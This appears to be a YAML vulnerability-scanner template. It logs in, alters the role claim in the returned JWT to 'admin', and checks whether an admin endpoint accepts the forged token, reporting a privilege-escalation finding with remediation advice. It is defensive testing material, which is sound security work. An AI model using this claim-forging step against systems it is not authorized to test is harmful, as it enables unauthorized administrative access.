id: generic-jwt-claim-escalation
info:
  name: JWT Claim Manipulation / Privilege Escalation
  severity: critical
  description: Tests for JWT claim manipulation to escalate privileges
  tags:
    - jwt
    - privilege-escalation
    - generic

variables:
  login_user: "{{AUTH_USERNAME}}"
  login_password: "{{AUTH_PASSWORD}}"

requests:
  - name: Authenticate to get JWT
    method: POST
    path: "{{login_endpoint}}"
    headers:
      Content-Type: "application/json"
    body: '{"username": "{{login_user}}", "password": "{{login_password}}"}'
    extractors:
      - type: json
        name: original_token
        selector: "{{jwt_token_selector}}"

  - name: Test admin access with escalated role claim
    method: GET
    path: "{{admin_endpoint}}"
    headers:
      Authorization: "Bearer {{jwt_claim(original_token, {{role_claim}}, admin)}}"
    matchers:
      - type: status
        values: [200]
      - type: word
        words: ["success", "data", "config"]
        condition: or
    on_match:
      vulnerability: JWT_PRIVILEGE_ESCALATION
      message: JWT claim manipulation allows privilege escalation to admin role
      remediation: Never trust JWT claims; validate on server against authoritative source
      evidence_strength: direct_observation
